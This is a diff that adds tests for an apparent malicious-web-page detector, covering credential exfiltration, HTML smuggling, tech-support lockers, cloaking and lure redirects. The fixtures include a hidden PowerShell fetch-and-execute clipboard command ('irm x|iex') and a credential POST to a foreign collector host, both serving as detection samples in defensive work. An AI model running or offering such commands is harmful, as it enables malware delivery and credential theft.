@@ -782,10 +782,11 @@ def _req(url, method="GET", post="", status=200, req_headers=None, set_cookie=No
     }
 
 
-def _cap(final_url, pages=(), har=(), dom_html=(), allowlisted=(), **result):
+def _cap(final_url, pages=(), har=(), dom_html=(), allowlisted=(), requests=(), **result):
     data = _data(final_url, pages, **result)
     data.har_entries = list(har)
     data.dom_html = list(dom_html)
+    data.requests = list(requests)
     data.allowlisted = set(allowlisted)
     return data
 
@@ -997,3 +998,148 @@ def test_extra_free_hosting_platforms_are_tenanted():
 
     assert free_hosting("kit.storage.dev") == "storage.dev"
     assert site("kit.storage.dev") == "kit.storage.dev"
+
+
+# --- round 2: A3 request log, jsapi hooks, archive listing, cloaking -------------------
+
+LOOSE_PW = {"action": "", "fields": [{"type": "password"}]}
+
+
+def test_script_posted_credentials_fires_and_same_site_is_quiet():
+    page = _page("https://kit.example/login", forms=[LOOSE_PW])
+    reqs = [{"method": "POST", "type": "fetch", "url": "https://collector.net/x",
+             "frame_url": "https://kit.example/login"}]  # noqa: E501
+    assert "script_posted_credentials" in _hits(_cap("https://kit.example/login", [page], requests=reqs))  # noqa: E501
+    same = [{"method": "POST", "type": "fetch", "url": "https://kit.example/api",
+             "frame_url": "https://kit.example/login"}]  # noqa: E501
+    assert "script_posted_credentials" not in _hits(_cap("https://kit.example/login", [page], requests=same))  # noqa: E501
+
+
+def test_runtime_dynamic_execution_fires_and_small_evals_are_quiet():
+    jsapi = {"exec": {"count": 3, "max_len": 4000, "max_entropy": 5.2}}
+    assert "runtime_dynamic_execution" in _hits(_cap("https://x.example/", jsapi=jsapi))
+    small = {"exec": {"count": 1, "max_len": 50, "max_entropy": 2.0}}
+    assert "runtime_dynamic_execution" not in _hits(_cap("https://x.example/", jsapi=small))
+
+
+def test_html_smuggling_binary_blob_fires_and_csv_export_is_quiet():
+    jsapi = {"blobs": [{"ctor": "Blob", "size": 50000, "mime": "application/octet-stream"}]}
+    data = _cap("https://x.example/", jsapi=jsapi,
+                downloads=[{"sha256": "aa", "suggested_filename": "invoice.exe"}])  # noqa: E501
+    data.download_heads = {"aa": b"MZ\x90\x00"}
+    assert "html_smuggling_binary_blob" in _hits(data)
+    # A reporting tool exporting a CSV via a blob, no risky download.
+    assert "html_smuggling_binary_blob" not in _hits(_cap("https://x.example/", jsapi=jsapi))
+
+
+def test_risky_archive_contents_and_clean_archive(tmp_path):
+    import zipfile
+
+    risky = tmp_path / "r.zip"
+    with zipfile.ZipFile(risky, "w") as zf:
+        zf.writestr("invoice.lnk", b"x")
+    clean = tmp_path / "c.zip"
+    with zipfile.ZipFile(clean, "w") as zf:
+        zf.writestr("report.pdf", b"%PDF-1.7")
+
+    def cap(path):
+        d = _cap("https://x.example/",
+                 downloads=[{"sha256": "aa", "suggested_filename": path.name}])
+        d.download_heads = {"aa": path.read_bytes()[:32780]}
+        d.download_paths = {"aa": str(path)}
+        return d
+
+    assert "risky_archive_contents" in _hits(cap(risky))
+    assert "risky_archive_contents" not in _hits(cap(clean))
+
+
+def test_password_protected_archive_with_printed_password(tmp_path):
+    import pyzipper
+
+    enc = tmp_path / "e.zip"
+    with pyzipper.AESZipFile(enc, "w", encryption=pyzipper.WZ_AES) as zf:
+        zf.setpassword(b"infected")
+        zf.writestr("setup.exe", b"MZ")
+    page = _page("https://dl.example/", text="Download the file. Password: infected")
+    d = _cap("https://dl.example/", [page],
+             downloads=[{"sha256": "aa", "suggested_filename": "e.zip"}])  # noqa: E501
+    d.download_heads = {"aa": enc.read_bytes()[:32780]}
+    d.download_paths = {"aa": str(enc)}
+    assert "password_protected_archive_with_password" in _hits(d)
+    # No printed password on the page: quiet.
+    plain = _page("https://dl.example/", text="Download the file")
+    d2 = _cap("https://dl.example/", [plain], downloads=[{"sha256": "aa", "suggested_filename": "e.zip"}])  # noqa: E501
+    d2.download_heads = {"aa": enc.read_bytes()[:32780]}
+    d2.download_paths = {"aa": str(enc)}
+    assert "password_protected_archive_with_password" not in _hits(d2)
+
+
+def test_tech_support_locker_fires_and_video_fullscreen_is_quiet():
+    page = _page("https://alert.example/", title="Windows Defender Alert",
+                 text="Your computer is infected with a trojan. Call support now 1-800-555-0199.")  # noqa: E501
+    assert "tech_support_browser_locker" in _hits(_cap("https://alert.example/", [page], jsapi={"apis": {"requestFullscreen": 1}}))  # noqa: E501
+    vid = _page("https://video.example/", title="Watch", text="Play in fullscreen")
+    assert "tech_support_browser_locker" not in _hits(_cap("https://video.example/", [vid], jsapi={"apis": {"requestFullscreen": 1}}))  # noqa: E501
+
+
+def test_history_flooding_fires_above_threshold():
+    assert "history_flooding" in _hits(_cap("https://x.example/", jsapi={"apis": {"history.pushState": 40}}))  # noqa: E501
+    assert "history_flooding" not in _hits(_cap("https://x.example/", jsapi={"apis": {"history.pushState": 3}}))  # noqa: E501
+
+
+def test_push_notification_bait_fires_and_news_prompt_is_quiet():
+    bait = _page("https://verify.example/", title="Verify", text="Click Allow to continue and prove you are human")  # noqa: E501
+    assert "push_notification_bait" in _hits(_cap("https://verify.example/", [bait], jsapi={"apis": {"Notification.requestPermission": 1}}))  # noqa: E501
+    news = _page("https://news.example/", title="News", text="Subscribe for the latest headlines")
+    assert "push_notification_bait" not in _hits(_cap("https://news.example/", [news], jsapi={"apis": {"Notification.requestPermission": 1}}))  # noqa: E501
+
+
+def test_cloaking_scripted_bounce_fires_and_canonical_redirect_is_quiet():
+    bounce = [{"from": "https://kit.io/", "to": "https://www.google.com/404", "type": "js"}]
+    data = _cap("https://www.google.com/404", redirects=bounce)
+    data.domain_ages = {"kit.io": 5}
+    assert "cloaking_scripted_bounce" in _hits(data)
+    canon = [{"from": "http://shop.example/", "to": "https://www.shop.example/",
+              "type": "http_301"}]
+    ok = _cap("https://www.shop.example/", redirects=canon)
+    ok.domain_ages = {"shop.example": 5}
+    assert "cloaking_scripted_bounce" not in _hits(ok)
+
+
+def test_trusted_redirector_to_lure_fires_and_plain_ad_click_is_quiet():
+    chain = [{"from": "https://www.google.com/url?q=x", "to": "https://lure.example/",
+              "type": "js"}]
+    clip = [{"page": "p0", "api": "x", "text": "powershell -w hidden -c \"irm x|iex\""}]
+    assert "trusted_redirector_to_lure" in _hits(_cap("https://lure.example/", redirects=chain, clipboard=clip))  # noqa: E501
+    assert "trusted_redirector_to_lure" not in _hits(_cap("https://shop.example/", redirects=chain))
+
+
+def test_captcha_gated_credential_page_fires_and_allowlisted_is_quiet():
+    har = [_req("https://challenges.cloudflare.com/turnstile/v0/api.js")]
+    page = _page("https://login-portal.example/", title="Sign in", text="Microsoft", forms=[PASSWORD_FORM])  # noqa: E501
+    assert "captcha_gated_credential_page" in _hits(_cap("https://login-portal.example/", [page], har=har))  # noqa: E501
+    ok = _page("https://login.live.com/", title="Sign in", text="Microsoft", forms=[PASSWORD_FORM])
+    assert "captcha_gated_credential_page" not in _hits(_cap("https://login.live.com/", [ok], har=har, allowlisted=["live.com"]))  # noqa: E501
+
+
+def test_idp_cdn_uses_request_initiator_when_available():
+    """With the A3 log, the CDN asset's initiating document host decides, precisely."""
+    cdn_url = "https://aadcdn.msftauth.net/shared/logo.png"
+    page = _page("https://clone.example/", title="Sign in", text="Microsoft", forms=[PASSWORD_FORM])
+    har = [_req(cdn_url)]
+    reqs = [{"method": "GET", "type": "image", "url": cdn_url, "document_url": "https://clone.example/"}]  # noqa: E501
+    assert "idp_cdn_assets_foreign_page" in _hits(_cap("https://clone.example/", [page], har=har, requests=reqs))  # noqa: E501
+    # The asset was loaded by a Microsoft-owned document in the session: no clone.
+    reqs_ms = [{"method": "GET", "type": "image", "url": cdn_url, "document_url": "https://login.live.com/"}]  # noqa: E501
+    ms = _page("https://login.live.com/", title="Sign in", text="Microsoft", forms=[PASSWORD_FORM])
+    assert "idp_cdn_assets_foreign_page" not in _hits(_cap("https://clone.example/", [page, ms], har=har, requests=reqs_ms))  # noqa: E501
+
+
+def test_library_inventory_parses_cdn_versions():
+    page = {"frames": [{"url": "https://kit.example/", "title": "", "text": "", "forms": [],
+            "iframes": [], "scripts": [{"src": "https://cdn/crypto-js@4.1.1/crypto-js.min.js"},
+            {"src": "https://cdn/ajax/libs/jquery/3.6.0/jquery.min.js"}]}]}  # noqa: E501
+    libs = build_facts(_cap("https://kit.example/", [page]))["scripts"]["libraries"]
+    names = {lib["name"]: lib["version"] for lib in libs}
+    assert names.get("crypto-js") == "4.1.1"
+    assert names.get("jquery") == "3.6.0"
